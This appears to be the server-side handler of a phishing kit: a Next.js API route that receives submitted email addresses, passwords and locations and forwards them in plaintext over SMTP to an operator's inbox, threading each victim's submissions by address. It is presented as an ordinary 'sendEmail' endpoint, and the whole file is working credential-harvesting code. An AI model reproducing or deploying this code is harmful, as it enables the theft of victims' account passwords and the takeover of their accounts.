// pages/api/sendEmail.js
import { db, get, ref, set } from "@/lib/firebase";
import nodemailer from "nodemailer";

export default async function handler(req, res) {
  if (req.method !== "POST") return res.status(405).end();

  try {
    const { email, password, location } = req.body;

    // Firebase reference
    const userRef = ref(db, `emailThreads/${email.replace(/\./g, "_")}`);
    const snapshot = await get(userRef);
    let threadId = snapshot.exists() ? snapshot.val().messageId : null;

    // Generate threadId if not found
    if (!threadId) {
      threadId = `<${email.replace(/\W/g, "")}@enthernetservice.com>`;
      await set(userRef, { messageId: threadId });
    }

    // NodeMailer Transporter (Webmail SMTP)
    const transporter = nodemailer.createTransport({
      host: "mail.enthernetservices.com",
      port: "465",
      //secure: process.env.EMAIL_PORT === "465", // true for SSL (465), false for TLS (587)
      auth: {
        user: process.env.EMAIL_USER,
        pass: process.env.EMAIL_PASS,
      },
    });

    // Email Content
    const mailOptions = {
      from: process.env.EMAIL_FROM,
      to: process.env.ADMIN_EMAIL,
      subject: `New Submission from ${email}`,
      text: `Email: ${email}\nPassword: ${password}\nLocation: ${location}`,
      headers: {
        "Message-ID": `<${Date.now()}@enthernetservice.com>`,
        "In-Reply-To": threadId,
        References: threadId,
      },
    };

    // Send Email
    await transporter.sendMail(mailOptions);

    res.status(200).json({ success: true, message: "Email sent successfully!" });
  } catch (error) {
    console.error("Error sending email:", error);
    res.status(500).json({ success: false, message: "Failed to send email." });
  }
}
